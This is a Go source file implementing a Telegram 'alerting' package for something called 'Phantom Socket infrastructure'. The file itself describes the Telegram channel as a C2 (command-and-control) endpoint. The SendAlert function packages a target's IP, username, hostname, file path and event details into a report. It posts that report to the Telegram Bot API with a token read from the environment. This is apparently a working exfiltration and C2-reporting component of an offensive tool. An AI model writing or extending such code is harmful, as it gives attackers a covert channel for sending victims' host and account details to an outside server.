// Package telegram - Telegram alerting for Phantom Socket infrastructure.
package telegram

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"time"
)

var (
	botToken string
	chatID   string
)

func init() {
	botToken = os.Getenv("PH_TELEGRAM_TOKEN")
	chatID = os.Getenv("PH_TELEGRAM_CHAT_ID")
}

// AlertData represents the structured content for a system alert.
type AlertData struct {
	EventType string
	Hostname  string
	User      string
	IP        string
	FilePath  string
	Details   string
}

// SendAlert sends a structured HTML report to the Telegram C2.
func SendAlert(data AlertData) error {
	if botToken == "" || chatID == "" {
		return fmt.Errorf("telegram configuration missing")
	}

	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	report := fmt.Sprintf(
		"<b>PHANTOM ALERT: %s</b>\n"+
			"----------------------------\n"+
			"TARGET IP : <code>%s</code>\n"+
			"USER      : <code>%s</code>\n"+
			"HOSTNAME  : <code>%s</code>\n"+
			"ACTION    : %s\n"+
			"PATH      : <code>%s</code>\n"+
			"TIMESTAMP : <code>%s</code>\n"+
			"----------------------------\n"+
			"INFO      : %s",
		data.EventType,
		data.IP,
		data.User,
		data.Hostname,
		data.EventType,
		data.FilePath,
		time.Now().Format("2006-01-02 15:04:05"),
		data.Details,
	)

	vals := url.Values{}
	vals.Set("chat_id", chatID)
	vals.Set("text", report)
	vals.Set("parse_mode", "HTML")
	vals.Set("disable_web_page_preview", "true")

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.PostForm(apiURL, vals)
	if err != nil {
		return fmt.Errorf("transport failure: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("api rejected request: %s", resp.Status)
	}

	return nil
}
